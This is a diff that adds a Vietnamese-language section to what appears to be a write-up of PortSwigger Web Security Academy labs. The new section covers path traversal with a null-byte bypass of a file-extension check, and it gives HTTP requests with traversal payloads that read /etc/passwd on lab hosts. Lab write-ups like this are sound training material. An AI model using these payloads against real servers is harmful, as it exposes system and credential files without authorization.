@@ -132,6 +132,23 @@ GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
 Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
 ```
 
+### Lab: File path traversal, validation of file extension with null byte bypass
+#### Analysis
+Trên một số hệ thống cũ hoặc ngôn ngữ xử lý C-style:
+Khi chuỗi `../../../etc/passwd%00.png` được truyền vào hàm như `fopen()`:
+```c
+fopen("../../../etc/passwd\0.png", "r");
+```
+→ Hệ thống dừng đọc chuỗi tại null byte (\0). Tức là chỉ mở file: `../../../etc/passwd`, phần `.png` sau `%00` không còn ảnh hưởng.
+#### Exploit
+Tương tự như các lab trên nhưng gửi với request có `null byte (%00)`
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/2
+Host: 0a9d00870462f85880c9b2e400c6002c.web-security-academy.net
+```
+
+- Một số hệ thống sẽ filter dựa trên `extension`, trường hợp này là `.png`
+- Nên sử dụng `null byte` để tách bỏ `extension` ra, đọc file `/etc/passwd`
 
 ---
 Goodluck! 🍀🍀🍀
